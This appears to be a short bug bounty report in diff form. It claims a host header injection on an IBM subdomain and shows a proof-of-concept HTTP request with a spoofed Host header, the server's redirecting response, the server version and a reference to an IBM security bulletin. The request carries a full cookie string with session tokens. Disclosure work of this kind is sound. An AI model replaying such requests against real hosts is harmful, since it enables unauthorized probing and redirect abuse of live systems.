@@ -1,0 +1,44 @@
+hello i can injection in header in this
+subdomain
+[http://jmb02.sl1029307.sl.edst.ibm.com/]
+
+POC:-
+-------------------------------------------------------------------------------
+Request:-
+GET /login.php?code=401&ruri=/login.php HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: __zlcmid=u9iWBzCDu4Xq68; userContext=0|eg|0; OPTOUTMULTI=0:0%7Cc1:1%7Cc3:1%7Cc2:1; utag_main=v_id:016d097c3ed3002314eca9d552c600044003100900918$_sn:1$_ss:1$_st:1567824000534$ses_id:1567822200534%3Bexp-session$_pn:1%3Bexp-session; bm_sz=47ADD3D5C6DCD6973D0209603C4D7C57~YAAQKYQUAhQpbghtAQAAUql/CwXkE8F4cMAfmAsU96M0n+I7uuDPhktj5dwDZPp0F6VBUW8JhvGw/o0zYmJyAcCYrhEUUMus//tCT5Uhw+n4v0p9ZRGgg/ZEJc3bWwoBAi8eiRc6OocoCugbF+UNBfva4INLX4sd2hcTr4YFMaSDj1yiNs0LcjCa7JVj
+Upgrade-Insecure-Requests: 1
+-------------------------------------------------------------------------------
+Response:-
+HTTP/1.1 302 Moved Temporarily
+Date: Sat, 07 Sep 2019 12:48:12 GMT
+Server: Embedthis-Appweb/3.2.3
+Cache-Control: no-cache
+Content-Length: 306
+Connection: close
+Location: http://hackerone.com/login.php?code=401&ruri=/login.php
+
+<!DOCTYPE html>
+<html><head><title>Moved Temporarily</title></head>
+<body><h1>Moved Temporarily</h1>
+<p>The document has moved <a href="http://hackerone.com/login.php?code=401&ruri=/login.php">here</a>.</p>
+<address>Embedthis-Appweb/3.2.3 at sao-gw-vsrx02-vSRX-Node0 Port 80</address></body>
+</html>
+-------------------------------------------------------------------------------
+POC image:-
+1-
+-------------------------------------------------------------------------------
+
+Server Version:-
+Embedthis-Appweb/3.2.3 
+-------------------------------------------------------------------------------
+
+Reffernce :-
+https://www.ibm.com/support/pages/security-bulletin-ibm-storediq-affected-potential-host-header-injection-cve-2019-4166
